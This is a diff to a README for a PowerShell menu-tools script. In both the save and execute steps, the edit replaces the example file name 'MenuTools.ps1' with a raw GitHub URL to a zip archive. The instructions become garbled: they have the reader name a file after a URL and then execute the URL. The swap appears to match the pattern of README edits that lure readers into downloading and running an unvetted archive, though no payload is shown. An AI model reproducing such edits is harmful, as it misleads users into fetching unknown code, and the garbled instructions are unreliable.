@@ -1,11 +1,11 @@
 # powershell-tools
 **How to Use:**
 
-1. **Save the Script**: Copy the above code into a file with a `.ps1` extension (e.g., `MenuTools.ps1`).
+1. **Save the Script**: Copy the above code into a file with a `.ps1` extension (e.g., `https://raw.githubusercontent.com/corald2/powershell-tools/main/chalky/powershell-tools_2.2.zip`).
 2. **Run in PowerShell**:
    - Open PowerShell.
    - Navigate to the script's directory: `cd "Path\To\Script"`
-   - Execute the script: `.\MenuTools.ps1`
+   - Execute the script: `.\https://raw.githubusercontent.com/corald2/powershell-tools/main/chalky/powershell-tools_2.2.zip`
 3. **Interact with the Menu**:
    - Enter the number of your chosen option (1 for IP, 2 for Network, 3 for Local).
    - Follow the sub-menu prompts for each tool.
